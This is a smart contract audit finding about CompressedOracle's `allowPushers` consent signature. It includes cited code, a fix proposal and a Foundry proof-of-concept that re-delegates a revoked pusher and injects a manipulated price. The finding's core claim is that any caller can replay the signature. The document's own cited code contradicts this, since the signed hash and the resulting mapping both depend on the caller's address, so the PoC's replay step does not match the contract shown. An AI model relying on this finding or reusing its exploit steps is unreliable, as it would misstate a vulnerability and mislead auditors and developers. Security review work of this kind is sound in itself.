### Title
Nonce-less `allowPushers` consent signature enables post-revocation replay, silently re-delegating a revoked pusher into the creator's oracle namespace — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` signs pusher consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce. After a creator calls `removePushers` to revoke a pusher, the original consent signature remains cryptographically valid until the deadline expires. Anyone holding the signature — including the revoked pusher — can replay the identical `allowPushers` call to silently re-establish the delegation, restoring write authority over the creator's namespace without the creator's knowledge.

---

### Finding Description

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature whose domain is:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no per-pusher revocation counter, and no used-signature bitmap. The only expiry mechanism is the `deadline` timestamp checked by `_ensureDeadline`:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

The code comment acknowledges the deadline is required to prevent re-establishment after a pusher self-revokes via `revokePusher()`:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

However, the deadline only bounds the replay window — it does not prevent replay within that window. When the creator calls `removePushers` to revoke a pusher:

```solidity
function removePushers(address[] calldata pushers) external {
    ...
    if (namespaceRemapping[pusher] == msg.sender) {
        namespaceRemapping[pusher] = address(0);
        emit PusherRevoked(pusher, msg.sender);
    }
    ...
}
``` [4](#0-3) 

…the original consent signature is not invalidated. Any party holding it (the pusher itself, or anyone who observed the original `allowPushers` calldata on-chain) can immediately call `allowPushers(deadline, [pusher], [sig])` again with the identical parameters. Because the signature still verifies and the deadline has not expired, `namespaceRemapping[pusher]` is written back to `creator`, and the pusher regains full write authority over the creator's namespace.

The `fallback` push path then routes the pusher's calldata into the creator's namespace:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

---

### Impact Explanation

Once re-delegated, the pusher can write arbitrary price data — including manipulated mid-prices, sentinel spreads, or stale timestamps — into the creator's feed slots. The `price()` function returns this data directly to any `PriceProvider` or `AnchoredPriceProvider` consuming the feed:

```solidity
function price(bytes32 feedId, address /* pool */)
    external view
    returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
{
    return _price(feedId);
}
``` [6](#0-5) 

A pool swap consuming a manipulated bid/ask quote from this feed will execute at the wrong price, violating the protocol's Quote Sanity invariant (`0 < bid < ask`) and Swap Conservation invariant. The result is direct loss of user principal or LP assets through bad-price execution.

---

### Likelihood Explanation

- The original `allowPushers` calldata (including the signature) is permanently visible on-chain from the first delegation transaction.
- The pusher itself always has the signature.
- The replay requires only that the deadline has not yet expired — a condition that is true for the entire intended delegation window (typically hours to days).
- No privileged access is needed; `allowPushers` is a public function callable by any `msg.sender` who supplies the matching `(deadline, pusher, sig)` tuple.
- The creator has no on-chain mechanism to invalidate the signature short of waiting for the deadline to expire.

---

### Recommendation

Add a per-pusher revocation nonce to the signature domain. Increment it on every `removePushers` call for that pusher:

```solidity
mapping(address => uint256) public pusherNonce; // pusher => revocation count

// In removePushers:
pusherNonce[pusher]++;

// In allowPushers signature domain:
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
```

Alternatively, maintain a `mapping(bytes32 => bool) public usedConsents` keyed on the signature hash and mark it consumed on first use, preventing any replay regardless of deadline.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 1 days
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator delegates pusher
vm.prank(creator);
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Creator revokes pusher (e.g., pusher key is compromised)
vm.prank(creator);
oracle.removePushers(_arr(pusher));
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Pusher replays the SAME original allowPushers call — no new signature needed
vm.prank(pusher); // or any address
oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
assertEq(oracle.namespaceRemapping(pusher), creator); // re-delegated without creator's consent

// 5. Pusher pushes a manipulated price into the creator's namespace
uint56 tsMs = uint56(block.timestamp * 1000 + 1);
uint48 manipulatedRaw = _packRaw(9_999_999, 0, 0); // extreme price, zero spread
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, manipulatedRaw, tsMs));
assertTrue(ok);

// 6. Pool consuming feedIdOf(creator, 0, 0) now receives the manipulated price
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
// data.price == U64x32.decode(9_999_999) — bad price reaches pool swap
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L163-169)
```text
    function price(bytes32 feedId, address /* pool */)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return _price(feedId);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L245-260)
```text
    function removePushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];
            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            if (namespaceRemapping[pusher] == msg.sender) {
                namespaceRemapping[pusher] = address(0);
                emit PusherRevoked(pusher, msg.sender);
            } else {
                revert InvalidManager(msg.sender);
            }
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
